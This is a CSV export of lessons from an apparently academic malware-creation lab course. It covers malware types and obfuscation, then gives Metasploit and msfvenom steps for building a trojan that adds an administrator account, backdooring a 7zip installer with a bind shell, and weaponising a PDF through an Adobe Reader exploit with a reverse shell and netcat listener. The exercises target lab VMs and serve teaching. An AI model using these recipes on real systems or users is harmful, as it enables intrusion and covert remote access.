unit_id,unit_title,lesson_id,lesson_title,lesson_activity,lesson_activity_name,lesson_notes,lesson_video_id,lesson_objectives
1,Introduction,1,Terms & conditions,yes,Terms & conditions,assets/pdf/1-introduccion.pdf,,"<p style=""text-align: justify;""><font size=""+2"">This agreement applies to the malware creation course provided. In our tutorials, we only EVER hack our safe systems as a proof of concept and never engage in any illegal activity. The course was created for research purposes, and you should never apply the learning to harm any person or any system. The material is exclusively developed to improve the theoretical knowledge.</font></p>"
1,Introduction,2,About,,,assets/pdf/1-introduccion.pdf,,"<p style=""text-align: justify;""><font size=""+1"">In malicious software teaching, the theoretic focus is usually presented, however, a practical guidance rarely occurs. Practice allows a better understanding of the attacker's mind, as well as a different point of view from the academic world. To do so, this laboratory produces an interactive platform, where a student generates his own malware in a safe environment. This includes propagation and concealment types of malware, different techniques of obfuscation, amongst others, all of them essential in malware studies. </font>.</p>
<p style=""text-align: justify;""><font size=""+1"">Currently, the few online labs available start with an installation guide of a whole environment and the development of basic exercises, which sometimes entail problems in configuration, installation, etc. In addition, all students are limited to the same teaching pace and progress, and this fact generates boredom in advance students. The purpose of this research is avoiding all these problems by focusing on exercises to complement theory taught by the professor. Besides, students will be able to create their own malware and watch its performance, instead of merely picturing it.</font></p>"
1,Introduction,3,Objectives,,,assets/pdf/1-introduccion.pdf,,"<h2 style=""text-align: justify;""><span style=""font-size: large;"">General:</span></h2>
<p style=""padding-left: 30px; text-align: justify;""><span style=""font-size: large;"">To provide an overall understanding from both theoretical and practical perspectives for malicious software.</span></p>
<h2 style=""text-align: justify;""><span style=""font-size: large;"">Specific:</span></h2>
<ul>
<li><span style=""font-size: large;"">To offer the basic malware knowledge background for infoSec purposes.</li>
<li><span style=""font-size: large;"">To analyse and use Metasploit framework.</li>
<li><span style=""font-size: large;"">To create basic and advanced malware types.</li>
<li><span style=""font-size: large;"">To test evasion and obfuscation techniques.</li>
<li><span style=""font-size: large;"">To develop one's own payload for malware.</li>
</ul>"
1,Introduction,4,Architecture,,,assets/pdf/1-introduccion.pdf,,"<p style=""text-align: justify;""><font size=""+1"" style=""text-align: justify;"">This laboratory was created in Linux, explicitly in UBUNTU LTS which is a virtual machine containing the necessary tools for developing and testing malware in a safe environment. Besides, it is easy to distribute, manage and avoid misconfigurations or extra issues.</p>
<p><font size=""+1"" style=""text-align: justify;"">To create malware, the Metasploit framework is installed providing different modules for different needs. These last ones will be further studied in the upcoming units. In addition, the tutorial presents two vulnerable systems that can be exploited by the student with the malware created by himself. Furthermore, extra tools allow a student to gain supplementary skills for better malware development, including auxiliary methods for obfuscation and concealment.</p>
<p><font size=""+1"" style=""text-align: justify;"">Finally, the lab provides web tools. The first tool acts as a guide for the tutorial, and the second provides a visual interface where the new created malware is analysed by the most popular antiviruses. The result shows whether the malware will be detected or not.</p>
<p style=""text-align:center;""><img src=""/assets/img/architecture.png"" alt=""Environment for the malware laboratory."" /><font size=""-1"">Environment for the malware laboratory.</p><blockquote>
</blockquote>"
1,Introduction,5,Tools,,,assets/pdf/1-introduccion.pdf,,"<p style=""text-align: justify;""><font size=""+1"" style=""text-align: justify;"">In order to provide a wide scope, several tools are used in this laboratory. A brief explanation of them is presented below:</span></p>
<h3>Virtualization Management.</h3>
<p style=""text-align: justify;""><font size=""+1"">Virtualization manager is an environment that allows to create/handle/monitor/use different systems and services on only a physical machine. This is also known as 'hypervisor', nowadays available in several web providers such as VMware and VirtualBox. The laboratory VM (Virtual Machine) works in any hypervisor, while the vulnerable operating systems are installed in VirtualBox.</span></p><h3>Metasploit Framework.</h3>
<p><font size=""+1"">This is the most widespread open-source platform for the penetration testing community. Metasploit is extremely useful for our purposes since it allows creating, exploiting, and encoding different types of vulnerabilities used for malware development. The forthcoming unit will deeply explain it.</p></p><p style=""text-align:center;""><img src=""/assets/img/metasploitarchi.PNG"" width=""90%"" alt=""Architecture for the Metasploit platform."" /><font size=""-1"">Architecture for the Metasploit platform.</p><blockquote>
</blockquote>
<h2>Windows XP.</h2><p><font size=""+1"">Everyone recognises Windows as the most common operating system around the world. Hence, it is highly exposed to attacks by cyber criminals. The Windows security gap occurs for a concrete reason: Microsoft's software is designed for maximum ease-of-use, which means security risks are more likelihood. Microsoft should spend more time for security targets, but this is not always possible. Although there has been a huge improvement on recent operating system versions, it does not imply that old systems are no longer used.</p>
<p><font size=""+1"">Therefore, Windows XP (service pack 1) is suitable for use in this tutorial, since it is easy to exploit several well-known vulnerabilities, besides, Microsoft support has ended years ago. A virtual machine is installed on VirtualBox, it contains a user called ''UserXP'' and no password. This will allow us to interact with some malware in future exercises.</p>
<h3>Metasploitable OS.</h3>
<p><font size=""+1"">This operating system is a modified version of Ubuntu intentionally vulnerable, containing open services, backdoors, weak passwords, etc. These characteristics help us to exploit a system, in a similar way as a cyber-attack would do.</p>
<h3>Veil framework ordnance-payload.</h3>
<p><font size=""+1"">This is a special tool for evading antiviruses, working as a Metasploit compliment and using python. Veil framework allows creating payloads which will not be detected by an antivirus, not even the most popular ones such as ESET, Kaspersky, etc.</p>
<h3>VirusTotal.</h3>
<p><font size=""+1"">VirusTotal is a web service which scans files searching for malicious content. It provides an extensive report showing the antiviruses that detected or not the file. Besides, it is capable of showing details of the malware, in case it is detected.</p>"
1,Introduction,6,Basic background knowledge,,,assets/pdf/1-introduccion.pdf,,"<p><font size=""+1"">The following topics are suggested as basic background:</p><p><strong>Linux. </strong>Students should have basic knowledge and skills on Linux.</p>
<p><a title=""Linux cheat sheet"" href=""/assets/pdf/Linux-Cheat-Sheet.pdf"" target=""_blank""><font size=""+1"">Linux cheat sheet</a></p>
<p><a href=""https://www.digitalocean.com/community/tutorials/an-introduction-to-linux-basics"" target=""_blank""><font size=""+1"">An introduction to Linux and basics</a></p><p><font size=""+1""></p><p><a href=""http://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/"" target=""_blank""><font size=""+1"">Bind and reverse shell</a></p><p><font size=""+1"">The command ''man'', the Linux manual.</p>
<p><strong><font size=""+1"">VirtualBox. </strong>Students should know how to manage VMs, Startup,etc.</p>
<p><a href=""https://www.virtualbox.org/manual/ch01.html"" target=""_blank""><font size=""+1"">Manual for VirtualBox</a></p>
<p><a href=""http://www.makeuseof.com/tag/how-to-use-virtualbox/"" target=""_blank""><font size=""+1"">How to Use VirtualBox: User&rsquo;s Guide</a></p>"
2,Malicious Software,1,Basic concepts,yes,Activity Basic concepts,assets/pdf/2-Malicious Software.pdf,juw6sPEGuEk,"<h2>Malware:</h2>
<p style=""text-align:justify;""><font size=""+1"">This term comes from '<strong>mal</strong>icious soft<strong>ware</strong>' and is used to define any kind of software which intention is harmful or intrusive. Besides, it can exploit system vulnerabilities to carry on malicious actions. They can take the form of documents, executables files, web pages, etc.</p>
<p style=""text-align:center;""><span style=""font-size: xx-small;""><img src=""/assets/img/whatismalware.png"" width=""50%"" style=""display: block; margin-left: auto; margin-right: auto;"" alt=""Malware definition."" />Malware definition. https://www.network-support.com/wp-content/uploads/2016/10/What-Is-Malware-Infographic.jpg</p>
<p style=""text-align:justify;""><font size=""+1"">A malware file could be divided into different parts depending on its actions, the most important are: payload, signature and propagation section.</p>
<h3 style=""padding-left: 30px;"">Payload:</h3>
<p  style=""text-align:justify;"" style=""padding-left: 30px;""><font size=""+1"">The payload part of a virus is that portion of the code not related to propagation or concealment, namely, is in charge of performing the malicious action. From the attacker point of view, this is the part where he takes advantage of the system, for example, adding a new user, controlling a webcam, etc.</p>
<h3 style=""padding-left: 30px;"">Signature:</h3>
<p style=""text-align:justify;"" style=""padding-left: 30px;""><font size=""+1"">The signature part of a virus is that portion where the malware identifies whether the machine is infected or not, thus avoid overloading the machine with several instances of the same virus performing actions in parallel. Signature is usually a string with an impossible date or another sequence easy to search. Antiviruses have signatures databases which are used to find malware.</p>
<h3 style=""padding-left: 30px;"">Propagation section:</h3>
<p style=""text-align:justify;"" style=""padding-left: 30px;""><font size=""+1"">This part is in charge of replication, when the malware attempts to copy itself to other files or systems and sometimes, trying to reach as many infections as possible.</p>
<p style=""text-align:justify;""><font size=""+1"">Malware can be classified into a variety of categories, depending on propagation, concealment, or their malicious actions. They are further presented in the following lessons.</p>
<p style=""text-align: center;""><span style=""font-size: xx-small;""><img style=""display: block; margin-left: auto; margin-right: auto;"" src=""/assets/img/typesmalware.png"" alt=""Types of malware."" width=""50%"" />Types of malware. https://www.network-support.com/wp-content/uploads/2016/10/What-Is-Malware-Infographic.jpg</span></p>
<p><font size=""+1"">Complementary material:</p>"
2,Malicious Software,2,Types of malware:Propagation,yes,Activity Types of malware:Propagation,assets/pdf/2-Malicious Software.pdf,n8mbzU0X2nQ,"<p style=""text-align:justify;""><font size=""+1"">The categorization by propagation is divided into two well-known groups virus and worms:</p>
<p style=""padding-left: 30px;""><h3>Virus:</h3>
<p  style=""text-align:justify;"" style=""padding-left: 30px;""><font size=""+1"">A computer virus is a harmful piece of executable code which is used to take advantage of a device without the user's consent, typically by attaching itself to a host document that will generally be an executable file. The propagation is strictly by human-iteration; therefore, it depends on a special action to be executed, for example, by opening a document, clicking on a link, etc.</p>
<p style=""padding-left: 30px;""><font size=""+1"">The most common host for viruses are:</p>
<ul style=""padding-left: 60px;"">
<li>Executable files (such as the .exe files in Windows).</li>
<li>Boot sectors of disk partitions.</li>
<li>Script files for system administration (shell scripts files in Unix).</li>
<li>Documents (MS Office files, pdfs).</li>
<li>Every O.S. that allows third-party programs to run can support viruses.</li>
</ul>
<p  style=""text-align:justify;""  style=""padding-left: 30px;""><font size=""+1"">The replication is done by inserting the code in other host documents, however, these copies can be different. These are called mutation virus, which makes more difficult its detection by signature matching.</p>
<h3>Worms:</h3>
<p  style=""text-align:justify;""  style=""padding-left: 30px;""><font size=""+1"">A computer worm is a self-contained malware that spreads copies of itself without needing to inject itself into other programs, and often without human interaction. Typically, they exploit software/systems vulnerabilities and are propagated over the network to infect additional devices.</p>
<p  style=""text-align:justify;""  style=""padding-left: 30px;""><font size=""+1"">In most cases, they have a payload which deletes files or install backdoors. However, worms can cause indirect damage without a payload, for example overloading the network or memory ram.</p>
<p><font size=""+1"">Hence, the main difference is that a virus requires user-assistance for propagation, and a worm spreads itself.</p><p><font size=""+1"">Complementary material:</p>"
2,Malicious Software,3,Types of malware:Concealment,yes,Activity Types of malware:Concealment,assets/pdf/2-Malicious Software.pdf,n8mbzU0X2nQ,"<p><font size=""+1"">The categorization by concealment is the following:</p>
<h3 style=""padding-left: 30px;"">Virus:</h3>
<p  style=""text-align:justify;padding-left: 30px;""><font size=""+1"">Viruses are hidden in another file. There are several concealment methods such as Encrypted, Polymorphic, and Metamorphic virus. They are presented in the following lesson.</p>
<h3 style=""padding-left: 30px;"">Trojan:</h3>
<p   style=""text-align:justify;padding-left: 30px;"" ><font size=""+1"">A Trojan is a program that performs some useful tasks (from a user point of view), but also does something with malicious consequences (e.g., add a new account). Usually, a user or administrator accidentally install trojans, however, they can also be part of another malware.</p>
<p  style=""text-align:justify;padding-left: 30px;"">Trojans are commonly used for phishing since they have the largest potential for infection since a human being is considered the weakest link. Considering a trojan, its maximum potential for infection is by social-engineering, man-in-the-middle or download from insecure websites.</p>
<h3 style=""padding-left: 30px;"">Rootkit:</h3>
<p   style=""text-align:justify;padding-left: 30px;""><font size=""+1"">A Rootkit is a malware that modifies an operating system to hide existence of itself or another service (e.g. a reverse shell). Thus, it prevents and makes harder the detection for antiviruses. A common rootkit migrates a utility (used by the attacker) to a default service handled by an Operating System (e.g. Explorer.exe in windows).</p>
<h3 style=""padding-left: 30px;"">Backdoor:</h3>
<p  style=""text-align:justify;padding-left: 30px;""><font size=""+1"">A backdoor is a hidden feature or command in a program, that allows a given agent to bypass an authentication method. It could be used by authenticated users or not, usually, they are installed for an admin to easily get access and provide support for users. However, backdoors are exploited by attackers such as Easter Eggs in DVDs and software.</p>
<p><font size=""+1"">Complementary material:</p>"
2,Malicious Software,4,Other types of malware,yes,Activity Other types of malware,assets/pdf/2-Malicious Software.pdf,Vkjekr6jacg,"<p><font size=""+1"">There are several extra types of malware, the most popular are:</p>
<h3 style=""padding-left: 30px;"">Spyware:</h3>
<p   style=""text-align:justify;padding-left: 30px;""><font size=""+1"">A spyware is a piece of code that gathers information about users without their consent and sends it to a third malicious person. They can be part of a trojan horse, the typical spywares are: keyloggers, accessing to webcam and microphone remotely.</p>
<h3 style=""padding-left: 30px;"">Ransomware:</h3>
<p   style=""text-align:justify;padding-left: 30px;""><font size=""+1"">A ransomware is considered as a type of malware that uses cryptography to harm data from a device. It encrypts the victim's data with a secret key in order to block the access from a legitimate user. Typically, it is used for extortion, the attacker demands a payment for exchanging the secret key and thus decrypting the files. A popular ransomware was spread in May 2017, called Wannacry and attacked 104 countries</p>
<h3 style=""padding-left: 30px;"">Adware:</h3>
<p   style=""text-align:justify;padding-left: 30px;""><font size=""+1"">The malware identified as adware is any kind of software able to automatically send advertisements. They are usually installed as a trojan and connected to an adware engine which is in charge to deliver the ads. The adware engine's owner profits money for each view or click. They are common in browsers and mobile phones.</p>
<h3 style=""padding-left: 30px;"">Botnet:</h3>
<p   style=""text-align:justify;padding-left: 30px;""><font size=""+1"">A botnet is a collection of bots capable of working together against one target. A bot is an individual machine under control of a bot-master and typically equipped with a larger repertoire of behaviours. The master sends a command received by each bot to perform the action. All bots together are powerful and can be used as distributed denial-of-service attack(DDoS).</p>
<p><font size=""+1"">Furthermore, on the cyber world, there are several kinds of malware that are not mentioned in this research. The following image illustrates the most common types.</p>
<p>&nbsp;</p>
<p style=""text-align:center;""><img src=""/assets/img/top10.png"" alt=""https://visual.ly/community/infographic/computers/malware-effect-trusted-site""  width=""90%"" /><font size=""-1"">https://visual.ly/community/infographic/computers/malware-effect-trusted-site</p><p><font size=""+1"">Complementary material:</p>"
2,Malicious Software,5,Malware obfuscation,yes,Activity Malware obfuscation,assets/pdf/2-Malicious Software.pdf,gNzfBZ9zDec,"
<p style=""text-align:justify;""><font size=""+1"">Antivirus scanners attempt to stop malware contamination, but malware developers have been working on different techniques to evade them, creating new malware that makes harder understanding its code, its purpose and its impact. The scanners look for signatures in code, but malware obfuscation creates a new different version with equal functionality, resulting in a completely different signature, thus scanners cannot detect it. There are three main methods: encrypted, polymorphic, and metamorphic.</p>
<h3>Encrypted malware:</h3>
<p style=""text-align:justify;""><font size=""+1"">This technique is built with an encryptor/decryptor engine which takes the code and encrypts it in a new version of itself; and, when the infected file is running, this engine decrypts the malware to perform the malicious action. It can generate different keys; therefore, a virus scanner looks for decryption engine instead of a specific signature. Popular methods used are XOR encryption, base64 encoding or a combination of these two.</p>
<h3>Polymorphic malware:</h3>
<p style=""text-align:justify;""><font size=""+1"">This technique consists in the ability to mutate the malware. Their decryptor engine creates new decryptor engines (variations of itself), thus always generating a new one that the antivirus cannot search the engine. However, antivirus has also evolved for detecting polymorphic malware through CPU emulator.</p>
<h3>Metamorphic malware:</h3>
<p style=""text-align:justify;""><font size=""+1"">Metamorphic methods are extremely challenging to be detected and they consist on malware that can transform its body by translating, editing and rewriting into new generations of themselves. The metamorphic body is different in each instance. This is the difference with polymorphic malware that has always the same body. Several techniques can be found, such as permutation of its code/instructions, dead-code insertion or instructions replacement.</p>
<p><font size=""+1"">Complementary material:</p>
<p><font size=""+1""><a title=""Malware Obfuscation Techniques: A Brief Survey"" href=""https://www.researchgate.net/profile/Kangbin_Yim/publication/221420990_Malware_Obfuscation_Techniques_A_Brief_Survey/links/5438112d0cf2d6698bdd16d7.pdf"">Malware Obfuscation Techniques: A Brief Survey</a></p>
"
3,Metasploit Framework,1,Introduction and Architecture,yes,Activity Introduction and Architecture,assets/pdf/3-Metasploit.pdf,TCPyoWHy4eA,"<p style=""text-align:justify;""><font size=""+1"">Metasploit Framework(MSF) is an entire penetration testing platform used for ethical hacking. There are two versions, a free open source called MSF community edition, and a paid pro-version bringing an extra graphical interface and support. MSF incorporates libraries to find and exploit several vulnerabilities for operating systems such as Windows, Linux, Mac OS, and Android for mobile phones. Since Metasploit framework has the mentioned features, it is commonly used to generate malware in the cyberworld.</p>
<p style=""text-align:justify;""><font size=""+1"">MSF has several modules, libraries and interfaces as shown in the figure below. The interface used in this tutorial is a non-graphical interface(console) due to its educational purpose. In this environment, the use of commands enhances learning processes and concepts. Other interfaces can also be used, although some commands used in the console work in another interface, no every option has its equivalent.</p>
<p  style=""text-align:center;""><img src=""/assets/img/metasploitarchi.PNG"" width=""80%"" style=""display: block; margin-left: auto; margin-right: auto;""  alt=""Architecture for the Metasploit platform."" /><font size=""-1"">Figure 1: Architecture for the Metasploit platform.</p></p>
<p style=""text-align:justify;""><font size=""+1"">The main feature on MSF are the modules, they are five and a brief explanation of them is presented below:</p>
<p style=""padding-left: 30px;text-align:justify;""><font size=""+1""><strong>Modulo Payloads:</strong> This module gives a collection of ""malicious"" codes that can be used against a specific target. Each payload has a defined action and this module is the most frequently used in malware development.</p>
<p style=""padding-left: 30px;text-align:justify;""><font size=""+1""><strong>Modulo Exploits:</strong>It contains a diverse group of exploits divided by the operating system, program, and vulnerability. Exploits can be combined with payloads to perform a complete penetration testing attack.</p>
<p style=""padding-left: 30px;text-align:justify;""><font size=""+1""><strong>Modulo Encoders</strong>:  MSF is not just used for malware development; besides it provides various algorithm to encode a final product, thus integrating obfuscation in a single tool.</p>
<p style=""padding-left: 30px;text-align:justify;""><font size=""+1""><strong>Modulo Nops</strong>: It allows to obtain or add Nops operations to a payload, making harder malware detection for a virus scanner.</p>
<p style=""padding-left: 30px;text-align:justify;""><font size=""+1""><strong>Modulo Auxiliary</strong>: This module contains extra tools, most of them are external and help in the penetration testing field. Among others useful mechanisms, vulnerability scanners as nmap can be found as well as sniffers.</p>
<p style=""text-align:justify;""><font size=""+1"">The version used in this tutorial is 'Metasploit v4.15.0' containing 1666 exploits, 488 payloads and 40 encoders. Two exclusive payloads developed by Xavier Riofrio are included for a better understanding of tools and malware creation</p>"
3,Metasploit Framework,2,Basic concepts and commands,yes,Activity Basic concepts and commands,assets/pdf/3-Metasploit.pdf,,"<p><font size=""+1"">In this tutorial, two manners of using Metasploit are presented: msfvenom and msfconsole. Both are used frequently, however, the commands are interchangeable among each other without a problem.</p>
<p><font size=""+1""><strong>Msfvenom</strong></p>
<p style=""text-align:justify;""><font size=""+1"">With msfvenom, the user can create directly payloads or encoders from the terminal. This is faster than msfconsole but needs the exact instruction to generate a correct result. To start, open a terminal line as  <strong>super user </strong>and type <em>msfvenom</em>, here you can see the options for the tool. To display the list of all the payloads available, run:</p>
<p><font size=""+1""><em>Msfvenom -l payload</em></p>
<p><font size=""+1""><strong>Msfconsole</strong></p>
<p style=""text-align:justify;""><font size=""+1"">It is an interactive interface, that can be slower since each option is set one by one. However, this is the most useful interface for beginners since information, options and settings are available for each module. To start, open a terminal line as <strong>super user(root)</strong> and type  <em>msfconsole. </em>The following commands can be used:</p>
<p  style=""padding-left: 30px;""><font size=""+1""><strong>Help:</strong> To display help of a certain exploit, payload or another module.</p>
<p  style=""padding-left: 30px;""><font size=""+1""><strong>Check: </strong>To verify if a target allows exploiting a specific vulnerability.</p>
<p  style=""padding-left: 30px;""><font size=""+1""><strong>Exploit/Run:</strong>To execute an exploit already configured.</p>
<p  style=""padding-left: 30px;""><font size=""+1""><strong>Show:</strong> To see a list of different modules (exploits, payloads, etc).</p>
<p  style=""padding-left: 30px;""><font size=""+1""><strong>Info:</strong> To view options, targets and extra information of a module or exploit selected.</p>
<p  style=""padding-left: 30px;""><font size=""+1""><strong>Set:</strong> Allows configuring an option for an exploit or payload.</p>
<p  style=""padding-left: 30px;""><font size=""+1""><strong>Unset:</strong> To delete the configuration of an option.</p><p   style=""padding-left: 30px;""><font size=""+1""><strong>Generate:</strong> It gives an output of payload in use.</p>
<p  style=""padding-left: 30px;""><font size=""+1""><strong>Search:</strong> To look for a specific module by name, O.S. or another module.</p>
<p  style=""padding-left: 30px;""><font size=""+1""><strong>Use:</strong>Allows setting the exploit or module to be used in the Metasploit console.</p>
<p style=""text-align:justify;""><font size=""+1"">Those are amongst the main, however, several additional ones are discovered along this tutorial.</p><p style=""text-align:justify;""><font size=""+1""><strong>Meterpreter</strong> </p><p><font size=""+1"">This is a special dynamically payload for post-exploitation executed as a bind or reverse shell in memory RAM. It contains several favourable utilities such as download/upload files from a target machine, hashdumb passwords and more. Meterpreter is employed for various exercises in the current tutorial.</p>"
3,Metasploit Framework,3,How to create a basic payload,yes,Activity How to create a basic payload,assets/pdf/3-Metasploit.pdf,,"<p style=""text-align:justify;""><font size=""+1"">To start creating malware, this lab begins with a simple trojan horse that allows adding a new user in windows without any warning for a legitimate user. To do this, we should know the payload, in msfconsole look for '<em>adduse</em>r' with the command <em>&lsquo;search adduser&rsquo;</em>. Once found it, the options can be displayed with <em>'info payload/windows/adduser'</em> as showed in the figure below. The options are four, although they have default values, the two options PASS and USER should be set.</p>
<p style=""text-align: center;""><span style=""font-size: xx-small;""><img style=""display: block; margin-left: auto; margin-right: auto;"" src=""/assets/img/capturas/adduserinfo.png"" alt=""Information about windows payload for adding a new user."" width=""90%"" />Information about windows payload for adding a new user.</span></p>
<p style=""padding-left: 30px;""><font size=""+1"">Note: This method can be used for any payload, exploit, etc.</p>
<p><font size=""+1"">The following instructions are to generate the payload:</p>
<p><font size=""+1""><em>&lsquo;Use payload/windows/adduser&rsquo; </em>to establish the payload in msfconsole.</p>
<p><font size=""+1""><em>&lsquo;set USER <span style=""color: #ff0000;"">new_user</span>&rsquo; </em>to configure username. You can use a username of your choosing.</p>
<p style=""text-align:justify;""><font size=""+1""><em>&lsquo;set PASS <span style=""color: #ff0000;"">new_pass</span>&rsquo; </em>to configure password. You can use a password of your choosing (to avoid problems do not use simple passwords).</p>
<p style=""text-align:justify;""><font size=""+1""><em>&lsquo;generate -f <span style=""color: #ff0000;"">file_name</span> -t <span style=""color: #ff0000;"">format</span>' </em>Finally, to get an output you should run generate, the lines showed are the representation of machine code for adding a new user. For a specific payload use the options: &lsquo;-f&rsquo; is the file name, and Metasploit supports many formats (exe in this case) with &lsquo;-t &lsquo;.</p>
<p><font size=""+1"">The figure below summarizes the mentioned steps.</p>
<p style=""text-align: center;""><span style=""font-size: xx-small;""><img style=""display: block; margin-left: auto; margin-right: auto;"" src=""/assets/img/capturas/trojan1.png"" alt=""Generating first trojan horse."" width=""70%"" />Generating first trojan horse.</span></p>
<p><font size=""+1"">You can get the same payload by using msfvenom with the next command line:</p>
<p style=""text-align: center;""><font size=""+1""><em>Msfvenom -p windows/adduser USER= <span style=""color: #ff0000;"">new_user</span> PASS= <span style=""color: #ff0000;"">new_pass</span> -f <span style=""color: #ff0000;"">format</span> -o <span style=""color: #ff0000;"">file_name</span></em></p>
<p style=""text-align:justify;""><font size=""+1"">Using msfvenom is faster, but you should know exactly how payload works. As a challenge, you can deduce the command options. Notice small changes, in msfvenom, the output format is given with '-f', instead of the file name.</p>
<p><font size=""+1"">Now, you have your first malware created. It is in the home folder of the machine. Then, how do we know if it works?</p>
<p style=""text-align:justify;""><font size=""+1"">Let's prove in windows XP VM. First copy the resulting file to the folder ""shared"" to pass toward our VM. Then, start the VM and browse to Shared folder. Once there, just execute the file. Finally, to prove the new user open a command prompt and run 'net user', you should see your new administrator user added to the machine. The trojan horse has had success!</p>"
3,Metasploit Framework,4,Cheat sheets,,,assets/pdf/3-Metasploit.pdf,,"<p><font size=""+1"">The following documents could be convenient for the student:</p>
<p><font size=""+1""><a href=""https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf"">Msfvenom and Metasploit commands</a></p>
<p><font size=""+1""><a href=""http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/"">Msfvenom cheat sheet: payloads</a></p>
<p><font size=""+1""><a href=""https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwjX9er2lMbVAhUSZlAKHbDzBg8QFggnMAA&url=https%3A%2F%2Fscadahacker.com%2Flibrary%2FDocuments%2FCheat_Sheets%2FHacking%2520-%2520Meterpreter%2520Cheat%2520%2520Sheet.pdf&usg=AFQjCNGSqgxKJRVulS5SIsrI-v9zPJGQcQ"">Meterpreter cheat sheet</a></p>
<p><font size=""+1""><a href=""https://www.cheatography.com/huntereight/cheat-sheets/metasploit-4-5-0-dev-15713/pdf_bw/"">Metasploit commands</a></p><p><font size=""+1""><a href=""https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf"">Netcat cheat sheet(Reverse and bind shell)</a></p>"
4,Creating Malware:Basic,1,Trojans,yes,Activity Trojans,assets/pdf/4-MalwareBasic.pdf,,"<p style=""text-align:justify;""><font size=""+1"">Now that we know how can create a basic malware, the next step is creating an advanced trojan horse. This one gets access to a windows machine, but a similar method can be used for Linux. .</p>
<p style=""text-align:justify;""><font size=""+1"">For this exercise, windows/shell_bin_tcp is the payload in use. Feel free to discover the options with command <em>info</em> or <em>search</em>in msfconsole. This example uses a bind shell to interconnect machines.  For more information about shells look  <a href=""http://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/"">Bind and reverse shell</a>, this is necessary for several exercises.</p>
<p style=""text-align:justify;""><font size=""+1"">As we know, a trojan horse is a malware that looks like a useful file, but it has a malicious action. This activity uses a legitim executable file to take advantage of a naive user. To start, open the msfconsole and read about this payload. Hint:  <em>'info payload/w.......'</em></p>
<p style=""text-align:justify;""><font size=""+1"">This payload contains two options namely: PORT that could be any (Default 4444 is fine) and RHOST that means remote host, in our case is the IP address of the machine interface connected with windows VM. Set it, and continue using the generate command.</p>
<p style=""text-align:justify;""><font size=""+1"">This trojan horse is generated slightly different since this example uses a legitim .exe file as a template. For this, the option  <em>&lsquo;-x&rsquo; </em>is used to designate a template. The complete command line is:</p>
<p style=""text-align: center;""><font size=""+1""><em>&nbsp;Generate &ndash; x <span style=""color: #ff0000;"">path_to_file</span> -f<span style=""color: #ff0000;""> file_name</span> -t<span style=""color: #ff0000;""> format</span></em></p>
<p style=""text-align:justify;""><font size=""+1""><em>Note: An original file is provided in /home/lab/7zip.exe, it is an installer for 7zip compressor. Feel free to use one different.</em></p>
<p style=""text-align:justify;""><font size=""+1"">The figure below illustrates the procedure.</p>
<p style=""text-align: center;""><span style=""font-size: xx-small;""><img style=""display: block; margin-left: auto; margin-right: auto;"" src=""/assets/img/capturas/trojan2.png"" alt="" Creating trojan horse with a template."" width=""80%"" /> Creating trojan horse with a template.</span></p>
<p style=""text-align:justify;""><font size=""+1"">The following command does the same with msfvenom:</p>
<p style=""text-align: center;""><em><font size=""+1"">Msfvenom -p windows/shell_bind_tcp -x <span style=""color: #ff0000;"">path_to_file</span> RHOST=<span style=""color: #ff0000;"">IP_address</span> -f <span style=""color: #ff0000;"">format</span> -o file_<span style=""color: #ff0000;"">name</span></em></p>
<p style=""text-align:justify;""><font size=""+1"">To test this malware, copy the new executable to the shared folder and execute it. This action will not show anything and it does not mean it was wrong, but that the bind shell is running in background. The final step is to connect the host machine to the VM, run the command  <em>""nc ip_address_windowVM port""</em>and wait for access. The following figure demonstrates this point.</p>
<p style=""text-align: center;""><span style=""font-size: xx-small;""><img style=""display: block; margin-left: auto; margin-right: auto;"" src=""/assets/img/capturas/trojanSuccessShelll.png"" alt="" Successful access to a windows machine."" width=""60%"" /> Successful access to a windows machine.</span></p>"
4,Creating Malware:Basic,2,Virus,yes,Activity Virus,assets/pdf/4-MalwareBasic.pdf,,"<p style=""text-align:justify;""><font size=""+1"">To demonstrate the functionality of a virus, this exercise uses a reverse shell connection from a PDF file. The payload used is like the one in lesson 4.1, the difference is that now the attacker is waiting for the user to run the trap file. Hence, the victim starts the connection and simplifies the configuration of the payload because the victim's IP is not needed and you set your own IP as a link. This method avoids misconfigurations and other common errors.</p>
<p style=""text-align:justify;""><font size=""+1"">Metasploit offers multiple exploits against common software, for example, Adobe reader or Foxit Reader. MSF takes advantage of known buffer overflows to execute a specific payload. You can look for different exploits using <em>'search pdf'</em> in the console. Each exploit works for diverse targets; however, MSF gives complete info about them.</p>
<p style=""text-align:justify;""><font size=""+1"">Our example uses 'exploit/fileformat/adobe_utilprintf', which is a buffer overflow in Adobe Reader version 8.1 or previous. The exploit only needs to be set with a filename and produce an output, but it does nothing until it is combined with any payload. At this point, a reverse shell is added in the payload with the IP address of the host machine.</p>
<p style=""text-align:justify;""><font size=""+1"">To create the malware in an exploit module is somewhat different, as instead of using <em>'generate' </em>, you use <em> 'run' or 'exploit' </em>. The figure below summarises this exercise.</p>
<p style=""text-align: center;""><span style=""font-size: xx-small;""><img style=""display: block; margin-left: auto; margin-right: auto;"" src=""/assets/img/capturas/virus.png"" alt="" Creating a PDF file used as a virus."" width=""80%"" /> Creating a PDF file used as a virus.</span></p>
<p style=""text-align:justify;""><font size=""+1"">As result, you get a PDF file. Copy this file to the shared folder. Before running the file in the VM, you must listen for connections. Netcat allows this with the command <em>'nc -l -p Port --vv'</em>, that listens on a specific port. Once listening, the attacker just should wait for the execution by a victim. The connection starts automatically and you should have access to the victim's machine as shown in the figure below.</p>
<p style=""text-align: center;""><span style=""font-size: xx-small;""><img style=""display: block; margin-left: auto; margin-right: auto;"" src=""/assets/img/capturas/virusSuccess.png"" alt=""Successful reverse shell from a PDF file."" width=""70%"" /> Successful reverse shell from a PDF file.</span></p>"
4,Creating Malware:Basic,3,Worm,yes,Activity Worm,assets/pdf/4-MalwareBasic.pdf,,"<p style=""text-align: justify;""><font size=""+1"">Creating a worm can be dangerous since it can spread out without control. Several cases have occurred such as the Morris worm. On the contrary, simulating worms in VMs could require high computer performance, since you need to virtualize a complete network.</p>
